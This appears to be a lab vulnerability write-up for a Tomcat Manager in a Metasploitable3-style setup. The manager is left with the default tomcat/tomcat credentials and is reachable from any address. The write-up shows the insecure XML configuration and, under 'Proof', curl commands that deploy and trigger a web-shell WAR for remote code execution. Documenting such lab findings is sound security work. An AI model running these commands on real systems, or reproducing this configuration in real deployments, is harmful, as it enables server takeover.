# Apache Tomcat Manager — Default Credentials, Exposed on All Interfaces

## Severity
**Critical** (CVSS 9.8)

## CVE
N/A (configuration weakness; enables arbitrary WAR deploy → RCE via the `manager-script`
role — see the Metasploit module `exploit/multi/http/tomcat_mgr_upload`.)

## Description
The Tomcat 8.0.33 instance on this host ships with:

- A `tomcat` user configured with password `tomcat` in `conf/tomcat-users.xml`.
- The `manager-gui`, `manager-script`, and `admin-gui` roles all assigned to that user.
- The `RemoteAddrValve` stripped out of `webapps/manager/META-INF/context.xml`, so the
  Manager app is reachable from every source address — not just `127.0.0.1` like the
  default install would restrict it to.

The `manager-script` role allows authenticated clients to **deploy arbitrary WAR files**
via `PUT /manager/text/deploy`. With known default credentials an attacker gains
remote code execution as the Tomcat service account with a single `curl` command.

This reproduces the shipped configuration of upstream Metasploitable3
(`scripts/chocolatey_installs/tomcat.bat` + the bundled `tomcat-users.xml`).

## Affected Service
- **Service:** Apache Tomcat 8.0.33
- **Port:** 8080/TCP
- **Credentials:** `tomcat` / `tomcat`
- **Config:**
  - `C:\tomcat\conf\tomcat-users.xml` — user / role definitions
  - `C:\tomcat\webapps\manager\META-INF\context.xml` — address-based access control

## Vulnerable Configuration
```xml
<!-- tomcat-users.xml -->
<user username="tomcat" password="tomcat"
      roles="manager-gui,manager-script,admin-gui"/>
```
```xml
<!-- manager/META-INF/context.xml — RemoteAddrValve removed -->
<Context antiResourceLocking="false" privileged="true">
  <!-- (no <Valve className="...RemoteAddrValve" .../>) -->
</Context>
```

## Proof
```
curl -u tomcat:tomcat --upload-file shell.war \
    "http://<target>:8080/manager/text/deploy?path=/shell"
# -> OK - Deployed application at context path [/shell]
curl "http://<target>:8080/shell/"
# -> webshell executes
```
